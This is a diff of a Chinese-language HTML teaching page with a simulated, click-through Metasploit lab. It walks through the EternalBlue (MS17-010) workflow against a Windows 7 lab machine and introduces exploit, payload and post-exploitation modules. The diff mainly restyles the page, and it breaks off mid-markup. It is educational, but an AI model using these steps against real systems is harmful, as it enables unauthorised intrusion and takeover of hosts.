@@ -3,136 +3,189 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Metasploit Framework 滲透測試模擬 | 資安工具入門教學</title>
+    <title>Metasploit 滲透測試模擬 | 資安模擬學習</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        /* --- 1. 基礎樣式 --- */
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body { line-height: 1.6; color: #e0e0e0; background-color: #0d1117; position: relative; overflow-x: hidden; }
+        /* --- 1. Metasploit 主題美術風格 (Void Purple) --- */
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Consolas', 'Monaco', 'Courier New', monospace; }
+        body { line-height: 1.6; color: #e0e0e0; background-color: #050505; position: relative; overflow-x: hidden; font-family: 'Segoe UI', sans-serif; }
 
-        /* 背景特效 */
-        .security-background {
+        /* 動態背景 */
+        .void-background {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;
             background: 
-                radial-gradient(circle at 10% 90%, rgba(180, 70, 255, 0.15) 0%, transparent 50%),
-                radial-gradient(circle at 90% 10%, rgba(100, 200, 255, 0.1) 0%, transparent 50%),
-                radial-gradient(circle at 40% 40%, rgba(255, 100, 180, 0.08) 0%, transparent 50%);
-            animation: backgroundShift 20s ease-in-out infinite;
+                radial-gradient(circle at 10% 20%, rgba(180, 70, 255, 0.15) 0%, transparent 40%),
+                radial-gradient(circle at 90% 80%, rgba(100, 50, 255, 0.1) 0%, transparent 40%);
+            animation: bgPulse 8s ease-in-out infinite;
         }
-        .security-grid {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;
-            background-image: linear-gradient(rgba(180, 70, 255, 0.1) 1px, transparent 1px),
-                              linear-gradient(90deg, rgba(100, 200, 255, 0.1) 1px, transparent 1px);
-            background-size: 30px 30px;
-            animation: gridMove 20s linear infinite;
+        .hex-grid {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-image: 
+                linear-gradient(30deg, #1a0b2e 12%, transparent 12.5%, transparent 87%, #1a0b2e 87.5%, #1a0b2e),
+                linear-gradient(150deg, #1a0b2e 12%, transparent 12.5%, transparent 87%, #1a0b2e 87.5%, #1a0b2e),
+                linear-gradient(30deg, #1a0b2e 12%, transparent 12.5%, transparent 87%, #1a0b2e 87.5%, #1a0b2e),
+                linear-gradient(150deg, #1a0b2e 12%, transparent 12.5%, transparent 87%, #1a0b2e 87.5%, #1a0b2e),
+                linear-gradient(60deg, #2a1b3e 25%, transparent 25.5%, transparent 75%, #2a1b3e 75%, #2a1b3e),
+                linear-gradient(60deg, #2a1b3e 25%, transparent 25.5%, transparent 75%, #2a1b3e 75%, #2a1b3e);
+            background-size: 40px 70px;
+            background-position: 0 0, 0 0, 20px 35px, 20px 35px, 0 0, 20px 35px;
+            opacity: 0.1; z-index: -1;
         }
-        @keyframes backgroundShift { 0%, 100% { background-position: 0% 0%, 100% 100%; } 50% { background-position: 100% 100%, 0% 0%; } }
-        @keyframes gridMove { 0% { transform: translate(0, 0); } 100% { transform: translate(30px, 30px); } }
 
-        /* 容器與佈局 */
+        @keyframes bgPulse { 0%, 100% { opacity: 0.8; } 50% { opacity: 1; } }
+
+        /* 容器 */
         .container { width: 90%; max-width: 1400px; margin: 0 auto; padding: 20px; position: relative; }
+
+        /* 頁首 */
+        header {
+            background: rgba(20, 10, 30, 0.95); padding: 4rem 0; text-align: center; margin-bottom: 2rem;
+            border-radius: 12px; border: 1px solid #b446ff; box-shadow: 0 0 30px rgba(180, 70, 255, 0.2);
+            position: relative; overflow: hidden;
+        }
+        header::before {
+            content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(180, 70, 255, 0.2), transparent);
+            animation: shine 6s infinite;
+        }
+        @keyframes shine { 0% { left: -100%; } 100% { left: 100%; } }
         
-        /* Header & Nav */
-        header { background: rgba(13, 17, 23, 0.95); padding: 3rem 0; text-align: center; margin-bottom: 2rem; border-radius: 10px; border: 1px solid #8a2be2; box-shadow: 0 0 20px rgba(138, 43, 226, 0.2); }
-        header h1 { font-size: 2.3rem; margin-bottom: 1rem; background: linear-gradient(135deg, #8a2be2, #b466ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        header p { color: #8b949e; }
+        header h1 { 
+            font-size: 2.8rem; margin-bottom: 1rem; 
+            background: linear-gradient(135deg, #b446ff, #8a2be2);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 20px rgba(180, 70, 255, 0.4);
+        }
+        header p { font-size: 1.2rem; color: #d1a3ff; max-width: 800px; margin: 0 auto; }
+
+        /* 導覽列 */
+        nav {
+            background: #0f0518; padding: 1rem; border-radius: 8px; border: 1px solid #b446ff;
+            position: sticky; top: 0; z-index: 100; margin-bottom: 30px; box-shadow: 0 10px 20px rgba(0,0,0,0.5);
+        }
+        nav ul { display: flex; justify-content: center; list-style: none; gap: 20px; flex-wrap: wrap; }
+        nav a {
+            text-decoration: none; color: #d1a3ff; font-weight: 500; padding: 8px 16px;
+            border-radius: 4px; transition: 0.3s; border: 1px solid transparent;
+        }
+        nav a:hover { background: rgba(180, 70, 255, 0.15); color: #fff; border-color: #b446ff; box-shadow: 0 0 10px rgba(180, 70, 255, 0.3); }
+
+        /* --- 佈局 --- */
+        .grid-layout { display: grid; grid-template-columns: 2fr 1fr; gap: 30px; margin-bottom: 40px; }
+        .full-width { width: 100%; margin-bottom: 2rem; }
+        @media (max-width: 1024px) { .grid-layout { grid-template-columns: 1fr; } }
+
+        /* 卡片樣式 */
+        article {
+            background: rgba(20, 10, 30, 0.9); padding: 30px; border-radius: 8px; border: 1px solid #4a2b69; margin-bottom: 30px;
+        }
+        h2 { color: #b446ff; margin-bottom: 20px; padding-bottom: 10px; border-bottom: 1px solid #4a2b69; font-size: 1.8rem; display: flex; align-items: center; gap: 10px; }
+        h3 { color: #d1a3ff; margin: 25px 0 15px 0; font-size: 1.4rem; }
+        p, li { margin-bottom: 10px; color: #e0e0e0; font-size: 1.05rem; }
         
-        nav { background: rgba(13, 17, 23, 0.97); padding: 1rem 0; margin-bottom: 2rem; border-radius: 8px; border: 1px solid #8a2be2; position: sticky; top: 0; z-index: 100; backdrop-filter: blur(10px); }
-        nav ul { display: flex; justify-content: center; list-style: none; flex-wrap: wrap; }
-        nav li { margin: 0 0.8rem; }
-        nav a { text-decoration: none; color: #8b949e; font-weight: 500; padding: 0.5rem 1rem; border-radius: 4px; transition: all 0.3s; }
-        nav a:hover { background-color: rgba(180, 70, 255, 0.15); color: #b466ff; }
-
-        /* 主要內容區 */
-        .main-content { display: grid; grid-template-columns: 3fr 1fr; gap: 2rem; }
-        @media (max-width: 1024px) { .main-content { grid-template-columns: 1fr; } }
-
-        article { background: rgba(13, 17, 23, 0.92); padding: 2rem; border-radius: 8px; border: 1px solid #8a2be2; }
-        section { margin-bottom: 3rem; scroll-margin-top: 100px; }
-        
-        h2 { color: #b466ff; margin-bottom: 1.5rem; padding-bottom: 0.5rem; border-bottom: 2px solid #8a2be2; font-size: 1.8rem; }
-        h3 { color: #c285ff; margin: 1.5rem 0 1rem 0; }
-        p, li { color: #e0e0e0; margin-bottom: 0.8rem; }
-        ul, ol { margin-left: 1.5rem; margin-bottom: 1.5rem; }
-
-        /* 表格與標籤 */
-        table { width: 100%; border-collapse: collapse; margin: 1.3rem 0; border: 1px solid #8a2be2; }
-        th, td { padding: 0.7rem; text-align: left; border-bottom: 1px solid #8a2be2; }
-        th { background-color: rgba(180, 70, 255, 0.1); color: #b466ff; }
-        .module-tag { display: inline-block; padding: 0.3rem 0.6rem; border-radius: 3px; font-size: 0.85rem; border: 1px solid currentColor; }
-        .tag-exploit { color: #b466ff; background: rgba(180, 70, 255, 0.1); }
-        .tag-payload { color: #64c8ff; background: rgba(100, 200, 255, 0.1); }
-        .tag-auxiliary { color: #ffb446; background: rgba(255, 180, 70, 0.1); }
-
-        /* 流程圖 */
-        .metasploit-flow { display: flex; justify-content: center; gap: 15px; margin: 2rem 0; flex-wrap: wrap; }
-        .flow-item { text-align: center; }
-        .flow-icon { width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; border: 2px solid #b466ff; color: #b466ff; margin: 0 auto 10px; background: rgba(180, 70, 255, 0.1); }
-        .flow-arrow { color: #b466ff; font-size: 20px; align-self: center; }
-
-        /* 警告框 */
-        .info-box, .warning-box, .danger-box { padding: 1rem; margin-bottom: 1.5rem; border-radius: 0 4px 4px 0; border-left-width: 4px; border-left-style: solid; }
-        .info-box { background: rgba(180, 100, 255, 0.1); border-color: #b466ff; }
-        .warning-box { background: rgba(255, 171, 0, 0.1); border-color: #ffab00; }
-        .danger-box { background: rgba(255, 45, 85, 0.1); border-color: #ff2d55; }
-
-        /* 道德規範網格 */
-        .ethics-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px; }
-        @media (max-width: 768px) { .ethics-grid { grid-template-columns: 1fr; } }
-        .ethics-card { background: rgba(255,255,255,0.05); padding: 15px; border-radius: 4px; border: 1px solid #444; }
-        .ethics-card h4 { color: #b466ff; margin-bottom: 10px; border-bottom: 1px solid #444; padding-bottom: 5px; }
-
-        /* 代碼區塊 */
-        pre { background: #1c2128; color: #e0e0e0; padding: 1rem; border-radius: 4px; overflow-x: auto; margin: 1.2rem 0; border: 1px solid #8a2be2; border-left: 4px solid #b466ff; }
-        code { font-family: 'Courier New', monospace; color: #c285ff; }
+        /* [修正] 同時設定 ul 和 ol 的縮排，解決編號被擋住的問題 */
+        ul, ol { margin-left: 25px; margin-bottom: 15px; } 
 
         /* 側邊欄 */
-        aside { background: rgba(13, 17, 23, 0.92); padding: 1.5rem; border-radius: 8px; border: 1px solid #8a2be2; height: fit-content; position: sticky; top: 100px; }
-
-        /* --- 2. 模擬器樣式 --- */
-        .simulator-wrapper {
-            background: #000; border: 1px solid #444; border-radius: 8px; overflow: hidden;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.6); margin: 30px 0;
-            display: flex; flex-direction: column; height: 650px;
+        aside {
+            background: rgba(20, 10, 30, 0.9); padding: 25px; border-radius: 8px; border: 1px solid #b446ff;
+            height: fit-content; box-shadow: 0 0 20px rgba(180, 70, 255, 0.1); position: sticky; top: 100px;
         }
-        .sim-header { background: #1f1f1f; padding: 8px 15px; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; color: #aaa; font-size: 0.8rem; }
-        .sim-grid { display: grid; grid-template-columns: 200px 1fr 320px; flex: 1; overflow: hidden; }
-        .sim-controls { background: #111; border-right: 1px solid #333; padding: 15px; overflow-y: auto; }
-        .sim-btn { width: 100%; padding: 12px; margin-bottom: 8px; background: #1a1a1a; border: 1px solid #333; color: #888; text-align: left; cursor: pointer; border-radius: 4px; transition: all 0.2s; position: relative; }
-        .sim-btn:hover { background: #222; border-color: #666; color: #fff; }
-        .sim-btn.active { background: rgba(180, 70, 255, 0.15); border-color: #b466ff; color: #fff; border-left: 3px solid #b466ff; box-shadow: 0 0 10px rgba(180,70,255,0.1); }
-        .sim-btn strong { display: block; font-size: 0.9rem; margin-bottom: 2px; }
-        .sim-btn span { font-size: 0.75rem; opacity: 0.7; }
-        .sim-terminal { background: #0c0c0c; display: flex; flex-direction: column; font-family: 'Courier New', Courier, monospace; position: relative; }
-        .term-body { flex: 1; padding: 15px; overflow-y: auto; color: #00ff00; font-size: 0.95rem; line-height: 1.4; }
-        .prompt { color: #4f86f7; font-weight: bold; margin-right: 8px; }
-        .prompt.exploit { color: #ff3333; text-decoration: underline; }
-        .cursor { display: inline-block; width: 8px; height: 16px; background: #fff; animation: blink 1s infinite; vertical-align: text-bottom; }
+
+        /* 提示框 */
+        .info-box { background: rgba(180, 70, 255, 0.1); border-left: 5px solid #b446ff; padding: 20px; margin: 20px 0; border-radius: 4px; }
+        .danger-box { background: rgba(255, 50, 50, 0.1); border-left: 5px solid #ff3333; padding: 20px; margin: 20px 0; border-radius: 4px; }
+
+        /* --- 模擬器樣式 (Metasploit 風格) --- */
+        .simulator-wrapper {
+            background: #000; border: 2px solid #b446ff; border-radius: 12px; overflow: hidden;
+            box-shadow: 0 0 50px rgba(180, 70, 255, 0.2); margin: 20px 0;
+            display: flex; flex-direction: column; height: 750px;
+        }
+
+        .sim-header {
+            background: #1a0b2e; padding: 12px 20px; border-bottom: 1px solid #b446ff;
+            display: flex; justify-content: space-between; align-items: center;
+        }
+
+        .sim-grid {
+            display: grid; grid-template-columns: 240px 1fr 340px; flex: 1; overflow: hidden;
+        }
+
+        /* 控制區 */
+        .sim-controls { background: #0f0518; border-right: 1px solid #4a2b69; padding: 20px; overflow-y: auto; }
+        .sim-btn {
+            width: 100%; padding: 15px; margin-bottom: 12px; background: rgba(180, 70, 255, 0.05); border: 1px solid #4a2b69;
+            color: #d1a3ff; text-align: left; cursor: pointer; border-radius: 6px; transition: all 0.2s;
+        }
+        .sim-btn:hover { background: rgba(180, 70, 255, 0.15); color: #fff; border-color: #b446ff; }
+        .sim-btn.active { background: rgba(180, 70, 255, 0.25); border-color: #b446ff; color: #fff; border-left: 4px solid #b446ff; box-shadow: 0 0 15px rgba(180, 70, 255, 0.2); font-weight: bold; }
+        .sim-btn strong { display: block; font-size: 1rem; margin-bottom: 4px; }
+
+        /* 終端機 */
+        .sim-terminal {
+            background: #000; padding: 0; display: flex; flex-direction: column; 
+            font-family: 'Consolas', 'Courier New', monospace; position: relative;
+        }
+        .term-body { 
+            flex: 1; padding: 20px; overflow-y: auto; color: #e0e0e0; 
+            font-size: 1rem; line-height: 1.5; white-space: pre-wrap; 
+        }
+        .prompt { color: #fff; font-weight: bold; margin-right: 10px; text-decoration: underline; }
+        .cursor { display: inline-block; width: 10px; height: 18px; background: #b446ff; animation: blink 1s infinite; vertical-align: text-bottom; }
+
+        /* 解析區 */
+        .sim-decoder { background: #1a0b2e; border-left: 1px solid #4a2b69; display: flex; flex-direction: column; }
+        .decoder-header { padding: 15px; background: #0f0518; border-bottom: 1px solid #4a2b69; color: #b446ff; font-weight: bold; font-size: 1.1rem; }
+        .decoder-content { padding: 25px; flex: 1; overflow-y: auto; }
+        
+        .explanation-card { 
+            background: rgba(180, 70, 255, 0.08); border-left: 4px solid #b446ff; 
+            padding: 20px; border-radius: 4px; animation: slideIn 0.3s ease;
+        }
+        .analogy { 
+            margin-top: 15px; padding: 10px; background: rgba(255, 255, 255, 0.05); 
+            border-radius: 4px; color: #d1a3ff; font-style: italic; border: 1px dashed #b446ff;
+        }
+
+        /* 重置按鈕 */
+        .reset-btn {
+            background: transparent; border: 1px solid #b446ff; color: #b446ff; 
+            padding: 4px 12px; font-size: 0.8rem; border-radius: 4px; cursor: pointer; transition: 0.3s;
+        }
+        .reset-btn:hover { background: #b446ff; color: #fff; }
+
+        /* 表格 */
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 1.05rem; }
+        th { text-align: left; padding: 15px; background: rgba(180, 70, 255, 0.15); color: #b446ff; border-bottom: 2px solid #b446ff; }
+        td { padding: 15px; border-bottom: 1px solid #4a2b69; }
+        tr:hover { background: rgba(255,255,255,0.02); }
+
+        /* Banner Art */
+        .banner { color: #b446ff; font-weight: bold; margin-bottom: 20px; line-height: 1.2; font-size: 0.8rem; }
+
         @keyframes blink { 50% { opacity: 0; } }
-        .sim-decoder { background: #161b22; border-left: 1px solid #333; display: flex; flex-direction: column; }
-        .decoder-header { padding: 12px; background: #1a1a1a; border-bottom: 1px solid #333; color: #b466ff; font-weight: bold; font-size: 0.95rem; }
-        .decoder-content { padding: 20px; flex: 1; overflow-y: auto; }
-        .explanation-card { background: rgba(255,255,255,0.03); border-radius: 6px; padding: 15px; margin-bottom: 15px; border-left: 3px solid #b466ff; animation: fadeIn 0.5s ease; }
-        .explanation-card h4 { color: #fff; font-size: 1.1rem; margin-bottom: 8px; }
-        .explanation-card p { color: #ccc; font-size: 0.95rem; margin-bottom: 5px; line-height: 1.5; }
-        .analogy { color: #ffb446; font-style: italic; display: block; margin-top: 8px; font-size: 0.9rem; padding: 8px; background: rgba(255,180,70,0.1); border-radius: 4px; }
-        .analogy::before { content: "💡 白話文比喻："; font-weight: bold; font-style: normal; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
-        .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 5px; }
-        .status-idle { background: #666; }
-        .status-busy { background: #ffbd2e; animation: pulse 1s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
-        @media (max-width: 900px) { .sim-grid { grid-template-columns: 1fr; grid-template-rows: auto 300px auto; height: auto; } .sim-decoder { border-left: none; border-top: 1px solid #333; height: 300px; } }
+        @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* RWD */
+        @media (max-width: 1200px) { .sim-grid { grid-template-columns: 200px 1fr 280px; } }
+        @media (max-width: 900px) {
+            .sim-grid { grid-template-columns: 1fr; grid-template-rows: auto 400px auto; }
+            .sim-decoder { border-left: none; border-top: 1px solid #4a2b69; height: 350px; }
+            .simulator-wrapper { height: auto; }
+        }
     </style>
 </head>
 <body>
-    <div class="security-background"></div>
-    <div class="security-grid"></div>
+
+    <div class="void-background"></div>
+    <div class="hex-grid"></div>
 
     <header>
         <div class="container">
-            <h1><i class="fas fa-crosshairs"></i> Metasploit Framework 滲透測試模擬</h1>
-            <p>從理論到實戰 | 專為初學者設計的室</p>
+            <h1><i class="fas fa-bug"></i> Metasploit 滲透測試模擬</h1>
+            <p>漏洞利用框架 | 滲透測試入門 | 資安攻擊實戰模擬</p>
         </div>
     </header>
 
@@ -140,228 +193,214 @@
         <div class="container">
             <ul>
                 <li><a href="#intro">工具介紹</a></li>
-                <li><a href="#install">安裝與啟動</a></li>
-                <li><a href="#simulation">室</a></li>
-                <li><a href="#ethics">法律與道德</a></li>
+                <li><a href="#install">環境準備</a></li>
+                <li><a href="#simulation">滲透測試</a></li>
+                <li><a href="#modules">核心模組</a></li>
+                <li><a href="#ethics">法律規範</a></li>
             </ul>
         </div>
     </nav>
 
     <div class="container">
-        <div class="main-content">
-            <article>
-                <section id="intro">
-                    <h2><i class="fas fa-info-circle"></i> Metasploit 是什麼？</h2>
-                    <p><strong>Metasploit Framework</strong> 是一個開源的滲透測試框架，提供完整的漏洞利用、Payload 生成和後滲透測試工具，是資安人員必學的核心工具。</p>
+        
+        <div class="grid-layout">
+            <div class="content-left">
+                <article id="intro">
+                    <h2><i class="fas fa-info-circle"></i> 什麼是 Metasploit？</h2>
                     
-                    <h3>核心模組介紹</h3>
+                    <p><strong>Metasploit Framework (MSF)</strong> 是一個開源的滲透測試平台，它就像是駭客的「軍火庫」。</p>
+                    <p>它不只是一個工具，而是一個整合了數千種已知漏洞（Exploits）、攻擊載荷（Payloads）和輔助掃描工具（Auxiliary）的龐大系統。透過它，資安人員可以模擬真實的攻擊流程，驗證系統是否安全。</p>
+                    
+                    <div class="info-box">
+                        <p><strong><i class="fas fa-key"></i> 關鍵術語：</strong></p>
+                        <ul>
+                            <li><strong>Exploit (漏洞利用)</strong>：用來突破系統防禦的「鑰匙」。</li>
+                            <li><strong>Payload (攻擊載荷)</strong>：突破後要執行的「程式碼」（如遠端控制軟體）。</li>
+                            <li><strong>Meterpreter</strong>：Metasploit 最強大的 Payload，能完全控制受害主機。</li>
+                        </ul>
+                    </div>
+                </article>
+
+                <article id="install">
+                    <h2><i class="fas fa-server"></i> 實驗環境需求</h2>
+                    <pre><code style="color:#b446ff;"># 1. 啟動資料庫服務 (加速搜尋)
+sudo systemctl start postgresql
+
+# 2. 初始化資料庫
+sudo msfdb init
+
+# 3. 啟動主控台
+msfconsole</code></pre>
+                </article>
+            </div>
+
+            <aside>
+                <div style="margin-bottom: 30px;">
+                    <h3 style="margin-top:0; border-bottom:1px solid #4a2b69; padding-bottom:10px;">
+                        <i class="fas fa-laptop-code"></i> 實驗配置
+                    </h3>
+                    <ul style="list-style: none; margin: 0; padding: 0;">
+                        <li style="padding: 10px 0; border-bottom: 1px solid #4a2b69;">
+                            <i class="fas fa-check" style="color:#b446ff; margin-right:8px;"></i> 攻擊機: Kali Linux
+                        </li>
+                        <li style="padding: 10px 0; border-bottom: 1px solid #4a2b69;">
+                            <i class="fas fa-bullseye" style="color:#b446ff; margin-right:8px;"></i> 靶機: Windows 7 (x64)
+                        </li>
+                        <li style="padding: 10px 0; border-bottom: 1px solid #4a2b69;">
+                            <i class="fas fa-bug" style="color:#d1a3ff; margin-right:8px;"></i> 漏洞: MS17-010 (EternalBlue)
+                        </li>
+                        <li style="padding: 10px 0;">
+                            <i class="fas fa-network-wired" style="color:#8a2be2; margin-right:8px;"></i> 內網 IP: 192.168.56.102
+                        </li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h3 style="margin-top:0; border-bottom:1px solid #4a2b69; padding-bottom:10px;">
+                        <i class="fas fa-book"></i> 章節導覽
+                    </h3>
+                    <ul style="list-style: none; margin: 0; padding: 0;">
+                        <li style="padding: 8px 0;"><a href="#intro" style="color:#d1a3ff; text-decoration:none;">1. 工具介紹</a></li>
+                        <li style="padding: 8px 0;"><a href="#install" style="color:#d1a3ff; text-decoration:none;">2. 環境準備</a></li>
+                        <li style="padding: 8px 0;"><a href="#simulation" style="color:#d1a3ff;  text-decoration:none;">3. 滲透測試</a></li>
+                        <li style="padding: 8px 0;"><a href="#modules" style="color:#d1a3ff; text-decoration:none;">4. 核心模組</a></li>
+                        <li style="padding: 8px 0;"><a href="#ethics" style="color:#d1a3ff; text-decoration:none;">5. 法律規範</a></li>
+                    </ul>
+                </div>
+            </aside>
+        </div>
+
+        <div class="full-width">
+            <article id="simulation" style="border: 2px solid #b446ff; box-shadow: 0 0 30px rgba(180, 70, 255, 0.1);">
+                <h2><i class="fas fa-user-secret"></i> 互動虛擬實驗室</h2>
+                <p>現在，你將扮演攻擊者，利用著名的 <strong>EternalBlue (永恆之藍)</strong> 漏洞，嘗試取得一台 Windows 7 的控制權。請依序點擊左側步驟。</p>
+                
+                <div class="simulator-wrapper">
+                    <div class="sim-header">
+                        <div><i class="fas fa-terminal"></i> MSFCONSOLE (ROOT)</div>
+                        <button class="reset-btn" onclick="resetSim()">
+                            <i class="fas fa-redo"></i> 重置模擬器
+                        </button>
+                    </div>
+
+                    <div class="sim-grid">
+                        <div class="sim-controls">
+                            <button class="sim-btn" onclick="runStep(1)" id="btn-1">
+                                <strong>Step 1: 啟動 MSF</strong><span>msfconsole</span>
+                            </button>
+                            <button class="sim-btn" onclick="runStep(2)" id="btn-2">
+                                <strong>Step 2: 搜尋漏洞</strong><span>search ms17-010</span>
+                            </button>
+                            <button class="sim-btn" onclick="runStep(3)" id="btn-3">
+                                <strong>Step 3: 選擇模組</strong><span>use exploit/...</span>
+                            </button>
+                            <button class="sim-btn" onclick="runStep(4)" id="btn-4">
+                                <strong>Step 4: 設定目標 IP</strong><span>set RHOSTS ...</span>
+                            </button>
+                            <button class="sim-btn" onclick="runStep(5)" id="btn-5">
+                                <strong>Step 5: 執行攻擊 (Exploit)</strong><span>launch attack!</span>
+                            </button>
+                            <button class="sim-btn" onclick="runStep(6)" id="btn-6" style="border-left: 3px solid #00ff00; background: rgba(0,255,0,0.05);">
+                                <strong>Step 6: 系統資訊 (Post)</strong><span>sysinfo</span>
+                            </button>
+                        </div>
+
+                        <div class="sim-terminal">
+                            <div class="term-body" id="term-body">
+                                <div>Kali GNU/Linux Rolling [Version 2024.1]</div>
+                                <br>
+                                <div id="prompt-line" style="display:flex; flex-wrap:wrap;">
+                                    <span class="prompt" id="prompt-text">root@kali:~#</span>
+                                    <span id="typing-area"></span><span class="cursor"></span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="sim-decoder">
+                            <div class="decoder-header"><i class="fas fa-user-ninja"></i> 戰術解析</div>
+                            <div class="decoder-content" id="decoder-content">
+                                <div style="text-align: center; color: #d1a3ff; margin-top: 100px;">
+                                    <i class="fas fa-skull-crossbones fa-3x" style="margin-bottom: 20px;"></i><br>
+                                    準備就緒<br>點擊左側 <strong>Step 1</strong> 開始滲透
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </article>
+        </div>
+
+        <div class="grid-layout">
+            
+            <div class="content-left">
+                <article id="modules">
+                    <h2><i class="fas fa-cubes"></i> Metasploit 核心模組</h2>
+                    <p>MSF 的強大來自於它的模組化設計。最常用的有以下四類：</p>
+                    
                     <table>
                         <thead>
                             <tr>
-                                <th>功能</th>
-                                <th>說明</th>
-                                <th>模組類型</th>
+                                <th width="20%">模組類型</th>
+                                <th>功能說明</th>
                             </tr>
                         </thead>
                         <tbody>
                             <tr>
-                                <td><strong>漏洞利用 (Exploit)</strong></td>
-                                <td>利用程式的漏洞，像是拿鑰匙開門。</td>
-                                <td><span class="module-tag tag-exploit">Exploit</span></td>
+                                <td><strong>Exploit</strong></td>
+                                <td><span style="color:#b446ff;">漏洞利用</span>。這是核心，負責利用系統弱點進行突破。</td>
                             </tr>
                             <tr>
-                                <td><strong>載荷 (Payload)</strong></td>
-                                <td>入侵成功後要執行的程式，像特洛伊木馬裡的士兵。</td>
-                                <td><span class="module-tag tag-payload">Payload</span></td>
+                                <td><strong>Payload</strong></td>
+                                <td><span style="color:#b446ff;">攻擊載荷</span>。入侵成功後要執行的代碼（如 Meterpreter）。</td>
                             </tr>
                             <tr>
-                                <td><strong>輔助 (Auxiliary)</strong></td>
-                                <td>掃描、偵察工具，不進行破壞。</td>
-                                <td><span class="module-tag tag-auxiliary">Auxiliary</span></td>
+                                <td><strong>Auxiliary</strong></td>
+                                <td><span style="color:#b446ff;">輔助工具</span>。包含掃描器、嗅探器、指紋辨識等非攻擊工具。</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Post</strong></td>
+                                <td><span style="color:#b446ff;">後滲透</span>。取得權限後用來竊取密碼、清除紀錄的模組。</td>
                             </tr>
                         </tbody>
                     </table>
+                </article>
+            </div>
 
-                    <h3>Metasploit 工作流程</h3>
-                    <div class="metasploit-flow">
-                        <div class="flow-item">
-                            <div class="flow-icon" style="border-color:#b466ff; color:#b466ff;"><i class="fas fa-search"></i></div>
-                            <span>1. 掃描偵測</span>
-                        </div>
-                        <div class="flow-arrow">→</div>
-                        <div class="flow-item">
-                            <div class="flow-icon" style="border-color:#c285ff; color:#c285ff;"><i class="fas fa-bug"></i></div>
-                            <span>2. 選擇漏洞</span>
-                        </div>
-                        <div class="flow-arrow">→</div>
-                        <div class="flow-item">
-                            <div class="flow-icon" style="border-color:#8a2be2; color:#8a2be2;"><i class="fas fa-code"></i></div>
-                            <span>3. 配置 Payload</span>
-                        </div>
-                        <div class="flow-arrow">→</div>
-                        <div class="flow-item">
-                            <div class="flow-icon" style="border-color:#9d4edd; color:#9d4edd;"><i class="fas fa-terminal"></i></div>
-                            <span>4. 取得權限</span>
-                        </div>
-                    </div>
-                </section>
-
-                <section id="install">
-                    <h2><i class="fas fa-download"></i> 安裝與啟動</h2>
-                    <div class="step">
-                        <h3><span class="step-number">1</span>Kali Linux 啟動</h3>
-                        <pre><code># 啟動資料庫服務 (加速搜尋)
-sudo systemctl start postgresql
-
-# 初始化 Metasploit 資料庫
-sudo msfdb init
-
-# 啟動主程式
-msfconsole</code></pre>
-                    </div>
-                </section>
-
-                <section id="simulation">
-                    <h2><i class="fas fa-laptop-code"></i> 互動實戰實驗室 (Interactive Lab)</h2>
-                    <p>原本枯燥的指令練習，現在直接在這裡操作！請依照左側步驟點擊，右側將會用<strong>「最白話」</strong>的方式解釋駭客在做什麼。</p>
-                    
-                    <div class="simulator-wrapper">
-                        <div class="sim-header">
-                            <div><i class="fas fa-terminal"></i> Kali Linux Terminal</div>
-                            <div><span class="status-dot status-idle" id="status-dot"></span> <span id="status-text">就緒</span></div>
-                        </div>
-
-                        <div class="sim-grid">
-                            <div class="sim-controls">
-                                <button class="sim-btn" onclick="runStep(1)" id="btn-1">
-                                    <strong>Step 1: 啟動工具</strong><span>msfconsole</span>
-                                </button>
-                                <button class="sim-btn" onclick="runStep(2)" id="btn-2">
-                                    <strong>Step 2: 尋找漏洞</strong><span>search ms17-010</span>
-                                </button>
-                                <button class="sim-btn" onclick="runStep(3)" id="btn-3">
-                                    <strong>Step 3: 拿出武器</strong><span>use exploit...</span>
-                                </button>
-                                <button class="sim-btn" onclick="runStep(4)" id="btn-4">
-                                    <strong>Step 4: 瞄準目標</strong><span>set RHOSTS</span>
-                                </button>
-                                <button class="sim-btn" onclick="runStep(5)" id="btn-5">
-                                    <strong>Step 5: 設定間諜</strong><span>set Payload</span>
-                                </button>
-                                <button class="sim-btn" onclick="runStep(6)" id="btn-6">
-                                    <strong>Step 6: 發射攻擊！</strong><span style="color:#ff5f56">exploit</span>
-                                </button>
-                                <button class="sim-btn" onclick="runStep(7)" id="btn-7">
-                                    <strong>Step 7: 任務報告</strong><span>sysinfo</span>
-                                </button>
-                            </div>
-
-                            <div class="sim-terminal">
-                                <div class="term-body" id="term-body">
-                                    <div>Kali GNU/Linux Rolling [Version 2024.1]</div>
-                                    <div>Type "help" to see commands.</div>
-                                    <br>
-                                    <div id="prompt-line" style="display:flex; flex-wrap:wrap;">
-                                        <span class="prompt" id="prompt-text">root@kali:~#</span>
-                                        <span id="typing-area"></span><span class="cursor"></span>
-                                    </div>
-                                </div>
-                            </div>
-
-                            <div class="sim-decoder">
